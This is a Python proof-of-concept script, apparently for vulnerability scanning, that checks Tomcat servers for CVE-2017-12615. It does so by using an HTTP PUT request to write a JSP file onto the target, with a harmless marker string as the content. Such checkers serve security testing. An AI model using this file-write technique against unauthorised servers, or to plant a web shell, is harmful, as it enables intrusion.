'''
    Tomcat任意文件写入漏洞（CVE-2017-12615）检测脚本。
                                                    --by jammny.
    用法：
        python Tomcat_CVE_2017_12615.py 192.168.30.131:8080
'''

import requests, sys, random
from colorama import init, Fore

class Scan():
    def __init__(self, host):
        self.host = host

    def run(self):
        try:
            data = 'CVE-2017-12615'
            num = random.randint(0,9999)
            url = 'http://' + self.host + '/{}.jsp/'.format(num)
            res = requests.put(url=url, data=data)
            if res.status_code == 201:
                print(Fore.RED + '[+] 存在Tomcat任意文件写入漏洞（CVE-2017-12615）！')
                print(Fore.RED + '[+] 验证地址：http://' + self.host + '/{}.jsp'.format(num))
            else:
                print(Fore.GREEN + '[-] 可能不存在Tomcat任意文件写入漏洞（CVE-2017-12615）！')
        except:
            print(Fore.RED + '[-] 无法与目标建立连接！')

def run(host):
    main = Scan(host)
    main.run()

if __name__ == '__main__':
    host = sys.argv[1]
    #host = "192.168.30.131:8080"
    main = Scan(host)
    main.run()